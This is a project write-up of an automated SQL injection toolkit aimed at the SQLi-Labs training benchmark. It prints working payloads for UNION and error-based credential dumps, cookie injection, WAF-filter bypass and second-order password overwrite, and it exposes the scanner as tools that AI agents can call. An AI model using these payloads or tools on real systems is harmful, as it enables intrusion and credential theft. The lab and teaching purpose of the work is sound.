# Project Summary: Universal SQLi Agent Toolkit

**What this is.** A Python toolkit that audits the SQLi-Labs benchmark (lessons 1–30) under strict black-box rules, exposes its scanner and tutor as JSON-RPC tools through the Model Context Protocol, and runs unmodified on Linux, WSL2, macOS, and Windows.

**Verified result.** All 30 SQLi-Labs lessons resolved on a single end-to-end run, with `Total Successful Injections: 30/30` recorded in the project's own scan log (`core/injection_script_convo.json`, line 667). The full vulnerability profile is at `core/vulnerability_profile.json`.

**Target.** SQLi-Labs running on Apache 2.4.7 / PHP 5.5.9 / MySQL 5.x, hosted in Docker. The active environment for this submission uses WSL2 with the container reachable at `172.18.0.1`.

---

## What it does, end to end

You give the orchestrator a lesson number or a range. It does the rest: reset the lab database, run the black-box scanner against the lesson, write a JSON profile of what it found, take a Playwright screenshot of the result, and run sqlmap to dump credentials. A single command does all of this for thirty lessons:

```
python3 core/auto_orchestrator.py --range 1-30 --batch-size 10
```

The console output during a typical Lesson 1 run looks like this:

```
[config] Platform: linux | Target: 172.18.0.1 | sqlmap: /usr/local/bin/sqlmap
[*] Initializing Lab Environment (Full Reset)...
[*] Resetting SQLi-Labs database via http://172.18.0.1/sql-connections/setup-db.php...
[+] Database reset successful.
========================================
AUTOMATING LESSON 1
========================================
[*] Running Oracle Discovery...
[+] Less-1: GET UNION Injection Found. Cols: 3 | Reflected: [2, 3] | Closure: '
[+] Surgical Flush Successful for Less-1
[*] Discovery report filed to /home/chrom/sqli-universal-agent/lab_reports/Less-01/discovery/oracle_report.txt
[*] Capturing Visual Proof...
[*] Performing Systematic Data Flush...
[+] Lesson 1 fully documented.
```

Each lesson produces three artifacts on disk:

```
lab_reports/Less-01/
├── discovery/oracle_report.txt          # what the scanner found
├── visuals/auto_breakout.png            # Playwright screenshot of the breakout
└── automation/sqlmap_auto.log           # sqlmap's full credential dump session
```

The figure below is the screenshot from `lab_reports/Less-01/visuals/lesson1_dump.png`, which is what the page renders when the credential dump payload is pasted into a browser. It is included here as direct evidence that the injection works against a real HTTP target, not as a synthetic fixture:

![Lesson 1 credential dump rendering](figures/fig_lesson01_union_dump.png)
![[fig_lesson01_union_dump.png]]
*Lesson 1 after `?id=-1' UNION SELECT 1,(SELECT GROUP_CONCAT(username,0x7e,password) FROM users),3-- -`. The page renders normally because the injection is the WHERE clause of the lesson's primary query; the "Login name" and "Password" fields display values from the `users` table.*

---

## How the components fit together

There are five Python files. They sit in two directories. Each one has a single, narrow job.

| File | Lines | Job |
|------|-------|-----|
| `core/sqli_final.py` | ~700 | The black-box scanner. Takes `--lesson N` or runs all 30, decides closure / injection type / tamper mode from HTTP response behaviour, writes structured findings to `vulnerability_profile.json`, and writes weaponised payloads to `payloads.txt`. |
| `core/auto_orchestrator.py` | ~170 | The batch runner. Wraps `sqli_final.py`, captures Playwright screenshots, runs sqlmap as a subprocess, and merges results into `vulnerability_profile.json` without overwriting prior runs. |
| `core/sqli_tutor.py` | ~140 | The Socratic teaching layer. Reads `vulnerability_profile.json` and produces guided hints rather than direct answers. |
| `core/config.py` | 69 | Single source of truth for paths, target IP, sqlmap location, and Python interpreter. Detects platform at import time and uses `shutil.which` for tool discovery. |
| `mcp/sqli_mcp.py` | ~200 | The Model Context Protocol server. Exposes three JSON-RPC tools (`oracle_scan`, `browser_test`, `get_lesson_guidance`) so any MCP-compatible AI agent can drive the scanner without knowing any of the above. |

The shared state file is `core/vulnerability_profile.json`. Every component reads or writes it. A representative entry:

```json
{
    "1": {
        "type": "UNION-Based",
        "method": "GET",
        "parameter": "id",
        "closure": "'",
        "tamper": "none",
        "extra": "Cols:3"
    }
}
```

The decision to make this file the contract between components is the single architectural choice that makes the rest of the system tractable. The MCP server reads it. The tutor reads it. The orchestrator writes to it via the scanner. As long as the schema stays stable, any individual component can be replaced without rewriting the others.

---

## The MCP interface

The agent-facing surface is three Python functions in `mcp/sqli_mcp.py`, each decorated with `@mcp.tool()`:

```python
@mcp.tool()
def oracle_scan(lesson_number: int) -> str:
    """Runs the discovery scanner on the target lesson and returns the vulnerability profile."""

@mcp.tool()
def browser_test(url: str, payload: str, lesson_id: int) -> str:
    """Uses Playwright Python API to inject a payload and return a surgical DOM summary."""

@mcp.tool()
def get_lesson_guidance(lesson_number: int) -> str:
    """Returns Socratic teaching guidance for a lesson using the tutor's analysis logic."""
```

The wire format is JSON-RPC 2.0. A call to `oracle_scan(lesson_number=1)` looks like:

```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "oracle_scan",
    "arguments": {"lesson_number": 1}
  },
  "id": 1
}
```

The response is the JSON object stored under `"1"` in `vulnerability_profile.json`. Errors come back as `{"error": "..."}` rather than as Python exceptions, so the agent can branch on `if "error" in result:` regardless of what failed (timeout, missing file, lesson out of range, etc.).

The `browser_test` tool is the most interesting because it produces structured DOM data rather than a screenshot path. A typical response:

```json
{
  "target_url": "http://172.18.0.1/Less-1/?id=-1' UNION SELECT 1,database(),3--+",
  "screenshot": "/home/chrom/.../mcp_test.png",
  "status_code": 200,
  "page_title": "Less-1 **Error Based- String**",
  "detected_errors": [],
  "body_snippet": "Welcome    Dhakkan\nYour Login name:security\nYour Password:3"
}
```

The `body_snippet` field contains the rendered page text. When `body_snippet` shows `Login name:security`, the agent knows the injection worked, because `security` is the database name returned by `database()`. It does not need to read the PNG.

---

## How the scanner actually decides

The scanner uses different detection methods for different injection types, all grounded in observable HTTP response behaviour. The four pillars:

**UNION reflection** sends three hex-encoded marker strings (`gemini1`, `gemini2`, `gemini3`) as `UNION SELECT` columns and checks which ones appear in the response body. False positives are structurally impossible because the markers do not occur naturally on the web. Lessons 1, 2, 3, 4, 11, 12, 23, 25, 29, 30.

**Error-based extraction** uses `updatexml(1, concat(0x7e, SUBQUERY, 0x7e), 1)`. MySQL writes the offending XPath into the error response. The scanner parses the tilde-delimited extracted data with a four-pattern regex chain that handles different MySQL versions' delimiter conventions. Lessons 5, 6, 17, 18, 19, 20, 21, 22, 26, 27.

**Boolean-blind detection** sends two payloads, one that should evaluate true and one that should evaluate false, and compares the response lengths. A delta greater than 20 bytes confirms the injection. Lessons 9, 10, 28.

**Time-based detection** measures wall-clock response time after injecting `SLEEP(3)`. If the response takes 3 or more seconds, the injection succeeded. Lessons 7, 8.

Header and cookie injections (Lessons 18–22) use lesson-specific payloads in `solve_header_specific()` because each lesson has a different INSERT shape. Lesson 21 in particular requires base64-encoding because the server applies `base64_decode` to the cookie before it reaches the SQL:

![Lesson 21 base64 cookie injection](figures/fig_lesson21_base64_cookie.png)
![[fig_lesson21_base64_cookie.png]]
*Lesson 21 after a base64-encoded cookie payload. The plaintext payload is `admin') and updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(username,0x7e,password) FROM users),0x7e),1) #`; the cookie sent on the wire is its base64 encoding.*

Second-order injection (Lesson 24) is the only multi-step lesson. The scanner registers a user named `admin'#`, logs in as that user, then triggers a password change. The stored payload breaks out of the password update query, allowing the real admin's password to be overwritten. The full sequence is in `scan_second_order_generic()`.

---

## WAF bypass strategy

Lessons 25 through 28 strip SQL keywords or whitespace before reaching the database. The scanner has eight tamper modes for working around these filters; the relevant ones for SQLi-Labs are:

| Mode | What it does | Used on |
|------|--------------|---------|
| `keyword_replace` | Doubles SQL keywords (`UNION` → `ununionion`) so a single `preg_replace` pass leaves a working keyword | 25, 27 |
| `space_bypass` | Replaces literal spaces with URL-encoded newlines `%0a` | 26 (helper) |
| `inline_comment` | Wraps keywords in MySQL inline-comment syntax `/*!UNION*/` | edge cases |
| `waf_bypass` | Combines `%a0` whitespace, `%26%26`/`%7C%7C` for AND/OR, doubled keywords, and `'1'='1` instead of `--` | 26, 28 |
| `comment_strip` | Closes the SQL string with `'1'='` instead of using a comment terminator (when `--` and `#` are filtered) | 23 |

The `waf_bypass` payload for Lesson 26 reads `?id=1' && updatexml(1,concat(0x7e,(selselectect GROUP_CONCAT(username,0x7e,password) FROM users),0x7e),1) && '1'='1`. Every transformation in that string corresponds to a specific filter behaviour observed during testing:

![Lesson 26 WAF bypass result](figures/fig_lesson26_waf_bypass.png)
![[fig_lesson26_waf_bypass.png]]
*Lesson 26 after the `waf_bypass` payload. The `selselectect` survives the lesson's keyword filter, `&&` substitutes for the filtered `AND`, and the trailing `'1'='1` closes the SQL string without using a banned comment character. The credential dump appears in the rendered DOM.*

---

## Cross-platform configuration

The `core/config.py` module is what makes the toolkit run unmodified across operating systems. It detects platform at import time, locates tools dynamically via `shutil.which`, and uses `sys.executable` rather than a hardcoded `python` or `python3`:

```python
PLATFORM   = platform.system().lower()              # 'linux' | 'windows' | 'darwin'
TARGET_IP  = os.environ.get("TARGET_IP", "172.18.0.1")
SQLMAP_BIN = shutil.which("sqlmap") or "sqlmap"
NPX_BIN    = shutil.which("npx") or "npx"
PYTHON_BIN = sys.executable
BASE_URL   = f"http://{TARGET_IP}/"
```

Importing this module prints a startup banner that confirms what was detected:

```
[config] Platform: linux | Target: 172.18.0.1 | sqlmap: /usr/local/bin/sqlmap
```

Moving the project from Windows to WSL2 required changing one environment variable (`TARGET_IP=172.17.59.5` to `TARGET_IP=172.18.0.1`) and zero lines of code. Going back the other direction works the same way.

One small issue surfaced after the migration: the sqlmap binary on Ubuntu 22.04 has the shebang `#!/usr/bin/env python`, but Ubuntu only ships `python3` by default, so `env` cannot resolve `python` and the shebang fails before sqlmap runs. The fix is in the orchestrator, invoke sqlmap as a script through `sys.executable` rather than letting the shebang execute:

```python
SQLMAP_INVOKE = [PYTHON_BIN, SQLMAP_PATH]
sqlmap_cmd = SQLMAP_INVOKE + ["-u", target_url, "--batch", "--dbs", "--proxy", PROXY]
```

This bypasses the shebang and uses whatever Python is currently running the orchestrator. No host-OS modifications required.

---

## Per-lesson validation results

Single end-to-end scan output, with the breakdown by injection class:

| Class | Lessons | Result | Method |
|-------|---------|--------|--------|
| GET UNION | 1, 2, 3, 4, 23, 25, 29, 30 | 8 / 8 | hex marker reflection |
| GET Error-Based | 5, 6, 26, 27 | 4 / 4 | `updatexml` with `0x7e` delimiters |
| GET Time-Blind | 7, 8 | 2 / 2 | `SLEEP(3)` timing |
| GET Boolean-Blind | 9, 10, 28 | 3 / 3 | response length delta |
| POST UNION | 11, 12 | 2 / 2 | hex markers in POST body |
| POST Login-Bypass | 13, 14, 15, 16 | 4 / 4 | `') OR 1=1#` variants |
| POST Error-Based | 17 | 1 / 1 | `passwd` parameter, `updatexml` |
| Header (UA / Referer) | 18, 19 | 2 / 2 | INSERT-shape payload |
| Cookie (plain) | 20 | 1 / 1 | direct `uname` cookie |
| Cookie (Base64) | 21, 22 | 2 / 2 | `base64.b64encode` wrapper |
| Second-Order | 24 | 1 / 1 | register `admin'#`, password change |
| **Total** | 1–30 | **30 / 30** | |

The full per-lesson log is in `core/injection_script_convo.json`. The line that summarises the final state is:

```
Scan Completed.
Total Successful Injections: 30
Total Payloads Saved: 30
```

A representative `surgical_flush.txt` artifact, from `lab_reports/Less-21/automation/`:

```
SURGICAL FLUSH FOR LESSON 21
==============================
VULN TYPE: Error-Based
METHOD: COOKIE
PAYLOAD: ') AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(username,0x7e,password) FROM users),0x7e),1)-- -

EXTRACTED DATA:
Dumb
```

`Dumb` is the first row of the SQLi-Labs `users` table; subsequent rows are concatenated by `GROUP_CONCAT` and appear in the same field when the response is not truncated.

---

## Honest limits

Three things do not yet work the way I would want them to.

**The MCP-driven batch mode runs slightly behind the standalone scanner.** When the scanner runs end-to-end as a single process (`python3 core/sqli_final.py`), all 30 lessons resolve. When the same lessons are driven through the MCP layer one at a time (`oracle_scan(1)`, `oracle_scan(2)`, ...), four lessons (17, 26, 27, 28) intermittently report a detection without producing a credential dump. The cause is that `solve()` uses short-circuit return, the first detection method that matches stops the scan, and the matched method is not always the one with a working extraction path. The fix is a refactor of `solve()` into a priority queue (UNION > Error > Boolean > Time). On the followup list.

**Time-blind extraction is incomplete.** Lessons 7, 8, and 9 detect via `SLEEP(3)` timing, but the corresponding extraction code returns an existence check rather than a per-character binary search over `ascii(substring(...))`. Full credential extraction via time-blind would take roughly seven HTTP requests per character at three seconds each, which is several minutes per row. The scanner currently logs the detection and stops there.

**The MCP server has a hard concurrency ceiling.** Running more than ten parallel `oracle_scan` calls against header-injection lessons (which take 20–35 seconds each because they require an authenticated session) consistently triggers timeout cascades that crash the FastMCP process. The mitigation is a `--batch-size 10` cap on the orchestrator and sequential execution of header lessons. A server-side request queue would be more robust.

---

## Where the documents diverge

This summary is the high-level overview. Three companion documents go deeper:

- `WORKLOGS.md`, Ten selected entries from the build, in chronological order, covering the failures and fixes that shaped the architecture (the 502 proxy, the marker-design decision, the MCP rewrite that retired the Gemini CLI extension, the sqlmap shebang issue, etc).

- `ACADEMIC_PAPER.md`, The technical treatment of the framework as a research artifact: black-box methodology, detector design, MCP protocol mechanics, full validation matrix, and an honest accounting of what the framework does and does not demonstrate.

- `LEARNING_REFLECTION.md`, Six things I personally learned during the build, written in first person and structured around concrete debugging incidents rather than abstract takeaways.

The four documents share artifacts (the figures in `figures/`, the JSON profile, the surgical flush samples) but do not share text. Read them in any order.

---

## Quick reference

**Run the full suite:** `python3 core/auto_orchestrator.py --range 1-30 --batch-size 10`

**Run one lesson:** `python3 core/auto_orchestrator.py --lesson 21`

**Discovery only, no sqlmap:** `python3 core/auto_orchestrator.py --range 1-10 --batch-size 5 --dry-run`

**Standalone scanner:** `python3 core/sqli_final.py --lesson 1 --json`

**MCP server:** `python3 mcp/sqli_mcp.py` (registered automatically when configured in `opencode.json`)

**Where the answers live:** `core/vulnerability_profile.json` for the canonical lesson-to-shape mapping; `lab_reports/Less-XX/` for per-lesson artifacts; `payloads.txt` (regenerated each run) for browser-pasteable exploitation strings.
